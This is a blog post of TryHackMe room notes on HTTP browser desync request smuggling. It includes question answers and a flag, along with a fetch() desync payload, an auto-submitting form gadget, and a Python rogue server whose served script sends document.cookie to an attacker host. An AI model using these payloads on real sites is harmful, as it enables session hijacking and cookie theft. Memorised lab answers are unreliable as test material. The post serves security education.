@@ -1,0 +1,362 @@
+---
+layout: post
+title: "HTTP Browser Desync"
+date: 2025-01-01
+tags: ["tryhackme"]
+categories: [tryhackme]
+source_id: "a70b296c-ff3b-4ffd-a646-6603070b1a37"
+source_path: "Web Application Pentesting/HTTP Request Smuggling/HTTP Browser Desync.md"
+---
+
+#+title: HTTP Browser Desync
+#+filetags: #TryHackMe
+#+created: 2025-05-24
+#+hubs: TryHackMe/Web Application Pentesting/HTTP Request Smuggling
+#+url: (https://tryhackme.com/room/requestsmugglingbrowserdesync)
+
+:PROPERTIES:
+:ID:           ca331b07-489a-4b56-a74d-9733cb5379ad
+:ROAM_ALIASES:
+:CREATED:      2025-05-24
+:END:
+
+
+# HTTP Browser Desync
+
+## Task 1 | Introduction
+
+IntroductionRequest smuggling traditionally focuses on issues within the communication between frontend and backend servers or between backend servers in a proxy or load-balancing setup. The attention may not have been extensively directed toward understanding how these vulnerabilities manifest and can be explicitly exploited in how web browsers interpret and handle these smuggled requests.
+
+Desynchronizing the interpretation of requests within browsers adds a layer of complexity and opens up new possibilities for exploitation. This new technique necessitates only the desynchronization of the front-end server, impacting the victim's connection with their browser.
+
+Objectives
+1. Understand what HTTP Request Browser Desync is and its impact
+2. Identify Browser HTTP Request Smuggling vulnerabilities in web applications
+3. Exploit the vulnerability in a controlled environment
+
+ Pre-requisites 
+- A strong understanding of the HTTP protocol
+- Prior experience with traditional [Request Smuggling](https://tryhackme.com/room/httprequestsmuggling) techniques in Server-side contexts
+- An understanding of client-side attacks is foundational
+
+### **Answer the questions below**
+
+**Question:** I am ready to learn more about Request Smuggling Browser Desync!
+
+*Answer:* 
+
+     No answer needed
+
+---
+
+## Task 2 | HTTP features
+
+HTTP Keep-Alive
+HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.
+
+![Image 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/31b445178b7298aaff4c28904d625efd.svg)
+
+HTTP PipeliningUsually, with HTTP, one request results in one response. If the HTTP pipelining is enabled in the backend server, it will allow the simultaneous sending of two requests with the corresponding responses without waiting for each response. The only way to differentiate between two requests and a big one is by using the Content-Length header, which specifies the length in bytes of each request. The content header is an unnecessary header for most static file contents in a web application, like images or icons, since the backend server will usually not consider it.
+
+![Image 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/85db7590a8b78c3cc399dfc2c3a7507a.svg)
+
+### **Answer the questions below**
+
+**Question:** Which HTTP feature allows you to send multiple requests at once?
+
+*Answer:* 
+
+     Pipelining
+
+**Question:** Which HTTP feature allows you to reuse a TCP connection for multiple requests?
+
+*Answer:* 
+
+     Keep-Alive
+
+---
+
+## Task 3 | HTTP Browser Desync
+
+HTTP Browser Desync
+
+In a Browser Desync attack, the attacker aims to take control of a victim's account by exploiting vulnerabilities in a web application's user connection system.
+![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/21f9e7fbe4d84b54b4594155cce07321.svg)
+
+This attack occurs in two steps:
+
+1. The initial request, appearing legitimate, is intended to disrupt the user request queue by introducing an arbitrary request.
+2. Once the connection pool is compromised, the very next valid request will be replaced by the arbitrary request initiated in the previous step.
+
+Take a look at this high-level representation of the attack:
+
+![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/298d76a6f0bdc20abdd69a78516f1a46.png)
+
+In the diagram above, the client initiates a POST request utilizing the keep-alive feature, ensuring the connection remains persistent. This persistence allows for transmitting multiple requests within the same session. This POST request contains a hijack GET request within its body. If the web server is vulnerable, it mishandles the request body, leaving this hijack request in the connection queue. Next, when the client makes another request, the hijack GET request is added at the forefront, replacing the expected behavior.
+
+In this scenario, attempting to access the redirect page automatically will show the output from the 404 page instead of the redirect one.
+
+### **Answer the questions below**
+
+**Question:** Which component is desynchronized during this attack?
+
+*Answer:* 
+
+     Browser
+
+**Question:** How many HTTP requests are sent during a Browser Desync attack?
+
+*Answer:* 
+
+     Three
+
+---
+
+## Task 4 | HTTP Browser Desync Identification
+
+Start MachineHTTP Browser Desync Identification
+For a better understanding of HTTP Browser Desynchronization, we will use a web application vulnerable to [CVE-2022-29361](https://nvd.nist.gov/vuln/detail/cve-2022-29361). The web app will serve a single route.
+
+```
+from flask import Flaskapp = Flask(__name__)
+@app.route("/", methods=["GET", "POST"])
+def index():
+    return """ CVE-2022-29361
+Welcome to the Vulnerable Web Application
+"""
+if __name__ == "__main__":
+    app.run("0.0.0.0", 5000)
+```
+
+The web server impacted by this CVE is running Werkzeug v2.1.0, a versatile WSGI web application library. The crucial update in commit [4795b9a7](https://github.com/pallets/werkzeug/commit/4795b9a7) allows keep-alive connections when threaded or process options are configured.
+
+![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/2548368943dc6c40dad4558fc73e1943.png)
+
+To execute the attack, a straightforward approach is to utilize the `fetch` JavaScript function. This function allows for maintaining the connection ID across requests. The connection ID refers to a unique identifier assigned to a network connection between the client (browser) and the server. This identifier helps the server keep track of multiple connections and distinguish between them.This consistent connection ID lies in its ability to facilitate exploitation for an attacker that could expose user information or session tokens such as cookies.Moreover, in a cross-site attack, the browser shares user cookies based on how the `SameSite` flag is set (CORS), but this security rule doesn't apply if the current domain matches the remote one, as in Browser Desync attacks. In such cases, there's no restriction. You can hack your session by using the following payload from your browser command line.
+
+```
+fetch('http://MACHINE_IP:5000/', {    method: 'POST',    body: 'GET /redirect HTTP/1.1\r\nFoo: x',    mode: 'cors',})
+```
+
+1. `http://MACHINE_IP:5000/`
+This is the URL to which the HTTP request is made for the vulnerable server. In this case, it's the registration endpoint on the local server.
+2. `{ method: 'POST' }`**** The `method` parameter specifies the HTTP method for the request. Here, it's set to 'POST'.
+3. `{ body: 'GET /redirect HTTP/1.1\r\nFoo: x' }`**** In the body, there is the second request that is going to be injected into the queue.
+4. `{ mode: 'cors' }`**** This flag triggers an error when visiting the 404 web page and avoids following the redirect.
+
+First, let’s start the Virtual Machine by pressing the Start Machine button at the top of this task. The vulnerable website will be running at the port 5000.
+
+Furthermore, this implies that an attacker can obtain complete control over a victim's browser when the specified payload is executed from the victim.
+
+The following screenshots will show an example of the attack using the previous payload.
+
+![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/d7b193c819734e10a561827cffcfd406.png)
+
+The desync attack involves injecting an arbitrary request into the request HTTP queue. Upon refreshing the page, it redirects to the /redirect endpoint, leading to a 404 error page display since that route is not present. 
+
+![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/6cab09b50ae05a0cb793992a74c82307.png)
+
+### **Answer the questions below**
+
+**Question:** Which JavaScript function can help to perform a Browser Desync attack?
+
+*Answer:* 
+
+     fetch
+
+**Question:** Which security mechanism is bypassed via the Browser Desync attack?
+
+*Answer:* 
+
+     CORS
+
+---
+
+## Task 5 | HTTP Browser Desync exploit chaining XSS
+
+HTTP Browser Desync exploit chaining XSS
+
+Based on the considerations outlined in previous tasks, one potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code. However, this strategy necessitates the presence of an arbitrary file upload feature on the website.
+
+Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim.
+
+We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
+
+```
+<form id="btn" action="http://challenge.thm/"
+    method="POST"
+    enctype="text/plain">
+<textarea name="GET http://YOUR_IP HTTP/1.1
+AAA: A">placeholder1</textarea>
+<button type="submit">placeholder2</button>
+</form>
+<script> btn.submit() </script>
+```
+
+We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.
+Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.
+To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.
+
+To do so, we can set up a rogue server by serving a route with a malicious payload like `fetch('http://YOUR_IP/' + document.cookie);`
+
+ 
+```
+Be ready for the challenge in the next task; you will have to solve it using this exploit!
+```
+
+### **Answer the questions below**
+
+**Question:** Which technique can be combined to a Browser Desync attack to steal a user session?
+
+*Answer:* 
+
+     XSS
+
+---
+
+## Task 6 | Challenge
+
+Start MachineChallenge
+This challenge will require using the techniques learned in the previous tasks to steal the victim user's cookie.
+
+You do not have to hack your session but to intercept a vulnerable user's session!
+
+First, let’s start the Virtual Machine by pressing the Start Machine button at the top of this task. The vulnerable website will be running at the port 80. 
+
+The victim is accessing the website using the hostname `challenge.thm` and not the IP!
+
+The steps are:
+
+1. Identify that the current web server is vulnerable to Client-Side Desync
+2. Find a functionality that allows you to store a malicious gadget
+3. Build your malicious payload for the session takeover
+4. Combine everything and profit!
+
+If you are stuck in the exploitation, check the next walkthrough task!
+
+### **Answer the questions below**
+
+**Question:** What is the victim flag?
+
+*Answer:* 
+
+     THM{SMUGGLING_IS_FUN}
+
+---
+
+## Task 7 | Challenge Help
+
+Challenge Help
+ In this task, we will look for a possible way to solve the challenge of the previous task.
+
+Firstly, you have to add in your /etc/hosts file the following entry:
+
+`MACHINE_IP challenge.thm`
+
+It can be observed that utilizing the given payload and refreshing the page results in a 404 error page. This indicates that the web server is vulnerable to request smuggling browser desync.
+
+```
+fetch('http://challenge.thm/', {    method: 'POST',    body: 'GET /redirect HTTP/1.1\r\nFoo: x',    mode: 'cors',})
+```
+
+Next, we can observe that the contact page does not correctly sanitize text input, potentially allowing us to send an arbitrary payload.
+
+![Image 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/dff30d90a55e2ae46ef41aea01194e96.png)
+
+Visting [http://challenge.thm/securecontact](http://challenge.thm/securecontact) you can notice that the input from the message field is reflected but is not interpreted:
+
+![Image 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/ba1ae0a040c95ada5fcd3e3bbc44e28c.png)
+
+![Image 10]()
+
+The victim will instead visit another page [http://challenge.thm/vulnerablecontact](http://challenge.thm/vulnerablecontact) where the input will be interpreted.
+
+![Image 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/a2834f4fe56b297a57576c0f6d4992b6.png)
+
+Now, we just need to build our payload to redirect the victim user to fetch the second payload from our server:
+
+```
+<form id="btn" action="http://challenge.thm/"
+    method="POST"
+    enctype="text/plain">
+<textarea name="GET http://YOUR_IP:1337 HTTP/1.1
+AAA: A">placeholder1</textarea>
+<button type="submit">placeholder2</button>
+</form>
+<script> btn.submit() </script>
+```
+
+Finally, we will serve a payload on our controlled server to steal the user's cookie and send it to us.
+
+```
+#!/usr/bin/python3
+
+    
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class ExploitHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.send_header("Content-type","text/html")
+
+            self.end_headers()
+            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")
+def run_server(port=1337):   
+    server_address = ('', port)
+    httpd = HTTPServer(server_address, ExploitHandler)
+    print(f"Server running on port {port}")
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    run_server()
+```
+
+Run it by with the following command:
+
+```
+sudo python3 server.py
+```
+
+Note that the victim will make an additional request to port 8080; you can serve another Python web service by using:
+
+```
+sudo python3 -m http.server 8080
+```
+
+Now, after around a minute, you should get the flag!
+
+Terminal
+```Terminal 
+root@attackbox ~ [1]> sudo python3 -m http.server 8080 
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) 
+- - [18/Jan/2024 10:49:51] "GET /flag=THM{REDACTED} HTTP/1.1" 404 -w
+```
+
+### **Answer the questions below**
+
+**Question:** You did it!
+
+*Answer:* 
+
+     No answer needed
+
+---
+
+## Task 8 | Conclusion
+
+Conclusion
+Browser Desync represents a relatively recent and severe security threat in web applications, exploiting how servers handle HTTP requests. This attack relies on inconsistencies in how servers interpret request bodies during continuous connections, allowing attackers to manipulate subsequent requests for malicious purposes like Cross-Site Scripting (XSS).
+
+A special thanks to [@kevin_mizu](https://twitter.com/kevin_mizu?lang=it) for discovering the CVE presented, and [@albinowax ](https://twitter.com/albinowax)for identifying this new category of vulnerability!
+
+### **Answer the questions below**
+
+**Question:** I have finished the Request Smuggling Browser Desync room!
+
+*Answer:* 
+
+     No answer needed
+
+---
